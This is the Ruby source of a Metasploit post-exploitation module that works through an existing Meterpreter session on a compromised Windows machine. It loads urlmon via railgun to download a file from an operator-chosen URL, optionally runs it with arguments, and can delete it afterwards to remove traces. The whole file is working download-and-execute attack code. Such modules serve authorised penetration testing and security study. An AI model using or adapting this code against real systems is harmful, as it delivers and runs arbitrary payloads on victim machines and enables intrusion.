##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post
  include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Windows Manage Download and/or Execute",
			'Description'          => %q{
				This module will download a file by importing urlmon via railgun.
				The user may also choose to execute the file with arguments via exec_string.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision$',
			'Platform'             => ['windows'],
			'SessionTypes'         => ['meterpreter'],
			'Author'               => ['RageLtMan']
		))

		register_options(
			[
				OptString.new('URL',           [true, 'Full URL of file to download' ]),
				OptString.new('DOWNLOAD_PATH', [false, 'Full path for downloaded file' ]),
				OptString.new('FILENAME',      [false, 'Name for downloaded file' ]),
				OptBool.new(  'OUTPUT',        [false, 'Show execution output', true ]),
				OptBool.new(  'EXECUTE',       [false, 'Execute file after completion', false ]),
			], self.class)

		register_advanced_options(
			[
				OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
				OptBool.new(  'DELETE',        [false, 'Delete file after execution', false ]),
			], self.class)

	end

	# Check to see if our dll is loaded, load and configure if not

	def add_railgun_urlmon

		if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
			session.railgun.add_dll('urlmon','urlmon')
			session.railgun.add_function('urlmon', 'URLDownloadToFileW', 'DWORD', [
			['PBLOB', 'pCaller', 'in'],['PWCHAR','szURL','in'],['PWCHAR','szFileName','in'],['DWORD','dwReserved','in'],['PBLOB','lpfnCB','inout']
		])
			print_good("urlmon loaded and configured") if datastore['VERBOSE']
		else
			vprint_good("urlmon already loaded")
		end

	end

	def run

		# Make sure we meet the requirements before running the script, note no need to return
		# unless error
		return 0 if session.type != "meterpreter"

		# get time
		strtime = Time.now

		# check/set vars
		url = datastore["URL"]
		filename = datastore["FILENAME"] || url.split('/').last
		if datastore["DOWNLOAD_PATH"].nil? or datastore["DOWNLOAD_PATH"].empty?
			path = session.fs.file.expand_path("%TEMP%")
		else
			path = session.fs.file.expand_path(datastore["DOWNLOAD_PATH"])
		end
		outpath = path + '\\' + filename
		exec = datastore["EXECUTE"]
		exec_string = datastore["EXEC_STRING"]


		# set up railgun
		add_railgun_urlmon

		# get our file
		print_status("\tDownloading #{url} to #{outpath}") if datastore['VERBOSE']
		client.railgun.urlmon.URLDownloadToFileW(nil,url,outpath,0,nil)

		# check our results
		out = session.fs.file.stat(outpath)

		print_status("\t#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")

		# run our command
		if exec
			exec_string = nil if exec_string.empty?
      vprint_good("Running #{outpath}")
			res = cmd_exec(outpath, exec_string, 60)
			print_good(res) if datastore['OUTPUT']

					# remove file if needed
			if datastore['DELETE']
				vprint_good("\tDeleting #{outpath}")
				session.fs.file.rm(outpath)
			end
		end



	end
end

